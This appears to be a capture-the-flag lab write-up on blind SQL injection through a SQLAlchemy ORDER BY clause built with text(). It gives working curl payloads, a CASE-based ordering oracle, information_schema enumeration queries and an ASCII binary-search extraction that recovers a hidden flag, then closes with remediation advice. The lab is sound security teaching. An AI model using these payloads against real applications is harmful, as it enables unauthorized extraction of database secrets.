# The Royal Guard Rankings, Debrief

**Node:** `p5_2` &middot; **Flag:** `SEIYAKU{order_by_cant_be_bound}` &middot; **Route:** `GET /p5/roster` &middot; **Sink:** `challenges/phase5.py`, real MariaDB via a real SQLAlchemy `Session`, `ORDER BY` built with `text()` &middot; **Signal:** which roster row sorts first, a one-bit readout of a value in `royal_seal` the route never displays

## Why this is a genuinely different bug from p5_1

p5_1 (Manipulator's Firewall) was ORM injection in a **value** position:
a `'` closed the string literal the ORM's `text()` escape hatch spliced
untrusted input into, and the fix was simply to use `text()`'s own
bound-parameter syntax instead of an f-string. This floor is ORM
injection in an **identifier** position, and the reason it's worth its
own floor is that the p5_1 fix *does not exist here*.

A bound parameter can only ever stand in for a value. The database
protocol has a slot for "a literal value goes here" (`WHERE username =
?`), and the driver keeps that value in a channel completely separate
from the query text. It has **no** such slot for an identifier: you
cannot write `ORDER BY ?` and bind the column name `name`, because
`ORDER BY <column>` is part of the query's *structure*, decided before
the query is even a query, not a value filled in afterward. SQL's own
grammar has no placeholder in that position. So "order the roster by
whatever column the caller chose" has no parameterized form at all, and
a developer who needs it reaches for a raw string, exactly what this
route did (learn-orm-injection.md §4).

```python
# challenges/phase5.py, p5_2
rows = db.query(GuardRoster).order_by(text(sort)).all()
```

`text(sort)` places the caller's `sort` string verbatim into the
`ORDER BY` clause. For an ordinary column name it does exactly what it
looks like. For an entire `ORDER BY` *expression*, it does that too,
because `text()` executes exactly the SQL it's handed and `ORDER BY`
legitimately accepts expressions, not just column names.

## Why an ordinary request is completely clean

Every column on `guard_roster` is public, and a plain sort just sorts:

```bash
curl -s -G "$BASE/p5/roster" -H "Accept: application/json" --data-urlencode "sort=division"
```

returns the three Royal Guard rows ordered by division, with nothing
hidden and nothing leaked. This is the desk's real, intended feature.
And an invalid column is rejected by the database itself, which is also
the proof the input reaches real SQL rather than an allow-list:

```bash
curl -s -G "$BASE/p5/roster" -H "Accept: application/json" --data-urlencode "sort=this_column_does_not_exist"
```

```json
{"error":"the roster desk rejected that sort column","members":[],"sort":"this_column_does_not_exist"}
```

A real allow-list would have rejected `this_column_does_not_exist`
*before* any query ran, with no database round-trip at all. The fact
that the rejection is a database error ("Unknown column") instead is
the tell: whatever you type is reaching the `ORDER BY` clause.

## The oracle

`ORDER BY` accepts a `CASE` expression, and a `CASE` can sort the roster
two different ways depending on a condition:

```text
sort = (CASE WHEN <condition> THEN name ELSE division END)
```

The roster is seeded so that sorting by `name` and sorting by
`division` put a **different** member first:

```text
sort by name     -> first row  Menthuthuyoupi   (M before N before S)
sort by division -> first row  Neferpitou       (aerial-recon before cognition before defense)
```

So which member is listed first *is* the answer to `<condition>`:

```text
<condition> TRUE  -> roster sorts by name     -> first row  Menthuthuyoupi
<condition> FALSE -> roster sorts by division -> first row  Neferpitou
```

Live, against the real stack:

```bash
curl -s -G "$BASE/p5/roster" -H "Accept: application/json" \
    --data-urlencode "sort=(CASE WHEN 1=1 THEN name ELSE division END)"   # -> first: Menthuthuyoupi (TRUE)

curl -s -G "$BASE/p5/roster" -H "Accept: application/json" \
    --data-urlencode "sort=(CASE WHEN 1=2 THEN name ELSE division END)"   # -> first: Neferpitou     (FALSE)
```

That's a working one-bit oracle, built entirely out of the ordering the
desk thought was harmless.

## Discovering the target: table and column name

The oracle is working. You can ask yes/no questions about anything the
database can reach — but what should you ask *about*? The route never
names the hidden table. There are two ways to find it: enumerate
systematically using the database's own metadata, or reason from the
challenge description and confirm with the oracle. Both are shown here.

### Understanding the error signal

Before either approach, there is a useful side-effect of a broken SQL
reference. If you ask `SELECT COUNT(*) FROM fake_table` and
`fake_table` does not exist, MariaDB raises an error. The route catches
that and returns `{"error": "...", "members": []}` — no data, an error
key. If the table *does* exist, `COUNT(*)` returns a number, the oracle
gets a clean numeric result, and no error is raised.

This turns any reference into a yes/no existence check:

```python
def exists(sql_fragment: str) -> bool:
    """True = this SQL expression runs without error (the reference is real).
    False = MariaDB raised an error (table or column does not exist)."""
    try:
        oracle(f"({sql_fragment}) >= 0")
        return True
    except RuntimeError:
        return False
```

`exists("SELECT COUNT(*) FROM some_table")` returns `True` if the
table exists, `False` if it doesn't. Same pattern works for columns:
`exists("SELECT COUNT(some_col) FROM some_table")`.

### Path A — Systematic: use information_schema

Every MariaDB (and MySQL) database ships with a built-in read-only
meta-database called `information_schema`. It is not a secret: it is
documented and always present. It has a table called `TABLES` that
lists every table in every database on the server, and a table called
`COLUMNS` that lists every column in every table. Any SQL query that
runs can read from it.

**Step 1 — Find the current database name.**

The function `DATABASE()` returns the name of the database the current
connection is using. Ask the oracle how long it is, then extract it
character by character:

```
oracle("LENGTH(DATABASE()) > 0")          # sanity check: True
oracle("LENGTH(DATABASE()) <= 32")        # binary search -> actual length
oracle("ASCII(SUBSTRING(DATABASE(),1,1)) <= 115")  # first character, etc.
```

This gives you the database name without any guessing — it is whatever
the app is connected to. For this route it comes back as
`seiyaku_p5_roster`.

**Step 2 — List all tables in that database, excluding the one you
already know.**

`information_schema.TABLES` has a column `TABLE_NAME` and a column
`TABLE_SCHEMA` (the database it belongs to). Filter to the current
database and exclude `guard_roster` (you already know that one):

```sql
SELECT COUNT(*) FROM information_schema.TABLES
WHERE TABLE_SCHEMA = DATABASE()
AND TABLE_NAME != 'guard_roster'
```

Ask the oracle: `oracle("(SELECT COUNT(*) FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME!='guard_roster') > 0")` → True: at least one other table exists.

Binary-search the count, then extract each table's name:

```sql
SELECT TABLE_NAME FROM information_schema.TABLES
WHERE TABLE_SCHEMA = DATABASE()
AND TABLE_NAME != 'guard_roster'
LIMIT 1
```

Extract that string character by character with `ASCII(SUBSTRING(...))`.
It comes back as `royal_seal`. No guessing required.

**Step 3 — List columns in that table.**

`information_schema.COLUMNS` has `TABLE_NAME` and `COLUMN_NAME`.
Filter to `royal_seal`:

```sql
SELECT COLUMN_NAME FROM information_schema.COLUMNS
WHERE TABLE_SCHEMA = DATABASE()
AND TABLE_NAME = 'royal_seal'
LIMIT 1 OFFSET 1   -- offset 1 skips 'id', the first column
```

Extract that name character by character. It comes back as `flag`.

This is the fully systematic approach: no source code, no guessing, no
challenge text required. Any blind SQL injection oracle that can reach
`information_schema` can enumerate the entire schema this way.

### Path B — Logical shortcut: reason from the challenge description

If you read CHALLENGER.md carefully it gives away the shape of the
target. The objective says verbatim:

> *"the King keeps a **seal** the roster desk can reach without ever showing"*

The word **seal** is the hint. This is a CTF lab, so the developer
named the table something short and descriptive. The most natural
names: `royal_seal` (King's seal), `king_seal`, `seal`. Try them in
order with the existence check:

```python
for t in ["royal_seal", "king_seal", "seal"]:
    if exists(f"SELECT COUNT(*) FROM {t}"):
        print(f"found: {t}")
        break
```

`royal_seal` hits on the first try. For the column: in CTF labs the
flag column is almost always named `flag`, with `secret` or `value` as
fallbacks:

```python
for c in ["flag", "secret", "value", "seal"]:
    if exists(f"SELECT COUNT({c}) FROM royal_seal"):
        print(f"found: {c}")
        break
```

`flag` hits immediately. Two oracle calls total to confirm both names.

The shortcut saves time in a CTF where the naming is intentional. In a
real penetration test, Path A (information_schema) is the right tool —
you cannot assume the developer left hints in the UI copy.

## Walking the flag out, one character at a time

The flag lives in `royal_seal`, a table this route never selects into
any response. The `CASE` condition can reach it by subquery and ask a
yes/no question about a single character:

```
sort = (CASE WHEN ASCII(SUBSTRING((SELECT flag FROM royal_seal LIMIT 1),POS,1)) > MID THEN name ELSE division END)
```

`SUBSTRING(..., POS, 1)` isolates the character at position `POS`;
`ASCII(...)` turns it into its byte value; `> MID` is the yes/no
question. A binary search over `MID` (0..127) pins down each
character's exact ASCII value in ~7 requests instead of ~95, the same
bisection discipline as the Hunter Association phase's timing-blind
floor, read off row order instead of a clock.

**Why `ASCII()` and not a direct character comparison.** MariaDB's
default collation is case-insensitive: `'S' = 's'` evaluates **true**.
A direct `SUBSTRING(...) = 'S'` oracle would therefore be unable to
tell uppercase from lowercase and would corrupt the flag's case, the
exact same trap p4_6's LDAP extraction hit. `ASCII('S')` is `83` and
`ASCII('s')` is `115`, two distinct numbers, so comparing ASCII values
is naturally case-correct. The walk also self-terminates cleanly:
`ASCII()` of an empty string (a position past the end of the flag) is
`0`, so the first position that reads back `0` marks the end.

`solvers/p5_2.py` automates all of it, detection, the oracle check,
then the full binary-search extraction. Actual, unedited output of a
real run against this exact seed:

```
[p5_2] target: http://localhost:8000/p5/roster
[p5_2] step 1: invalid sort column is rejected (sort reaches SQL)
  ok: invalid column rejected -> 'the roster desk rejected that sort column'
[p5_2] step 2: confirm the CASE ordering oracle
  TRUE  (1=1) -> first row 'Menthuthuyoupi'
  FALSE (1=2) -> first row 'Neferpitou'
  ok: oracle produces a crisp, observable true/false signal
[p5_2] step 3: blind-extract the sealed flag off the ordering oracle
SEIYAKU{order_by_cant_be_bound}
[p5_2] recovered flag: SEIYAKU{order_by_cant_be_bound}
  ok: recovered flag matches: SEIYAKU{order_by_cant_be_bound}
[p5_2] ok: invalid column rejected, ordering oracle confirmed,
[p5_2]     flag blind-extracted through an ORDER BY identifier injection
[p5_2] PASS
```

## HxH analogy

A Conjurer's rules are only as sound as the ones they actually thought
to set. The roster desk's creator reasoned carefully about *values*,
nothing secret is ever selected into a roster listing, and concluded
the desk was safe, having never considered that the *order* of harmless
rows is itself an answer to a question, and that the question could be
about something the roster was never built to show. The seal was never
displayed. The guards simply rearranged themselves, in plain view, into
the shape of its contents, because the one thing the desk let a visitor
decide, who stands where in line, turned out to be enough.

## Remediation

- **Allow-list identifiers. Never parameterize them, because you
  can't.** A caller-chosen sort column must be checked against a small,
  explicit set of real, permitted column names in application code
  *before* it ever reaches a query, and anything else rejected outright:

  ```python
  ALLOWED_SORT = {"id", "name", "division"}
  if sort not in ALLOWED_SORT:
      abort(400)
  rows = db.query(GuardRoster).order_by(getattr(GuardRoster, sort)).all()
  ```

  Note the fix is not "use a bound parameter" (there is no bound
  parameter for an identifier) and not "escape the input" (an escaped
  column name is still an arbitrary column name). The only correct fix
  is to restrict the input to a closed set of known-good values.

- **This generalizes to every identifier position in any SQL API, raw
  or ORM-wrapped**: table names, column names, `ORDER BY`/`GROUP BY`
  targets. They are never parameterizable anywhere, which is exactly
  why they're worth finding by name during review, independent of
  whether the surrounding query otherwise looks safely bound.

- **Least-privilege database account.** This floor's injected ORDER BY
  could reach `royal_seal` only because the roster route's own DB user
  had `SELECT` on it. A user scoped strictly to the tables a feature
  legitimately reads shrinks what even a working oracle can ever
  reference.

- **Prefer the ORM's own typed ordering API over `text()` entirely.**
  `order_by(getattr(Model, allowlisted_name))` expresses exactly this
  query with no raw string anywhere, removing the escape hatch that
  made the bug possible in the first place.
